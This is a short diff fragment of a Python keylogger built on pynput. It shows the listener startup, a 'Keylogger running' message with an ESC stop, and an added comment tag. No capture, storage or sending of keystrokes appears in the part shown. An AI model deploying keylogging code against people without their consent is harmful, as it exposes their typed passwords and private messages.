@@ -23,3 +23,6 @@ def on_release(key):
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     print("[+] Keylogger running... Press ESC to stop.")
     listener.join()
+
+
+#ph1n3y
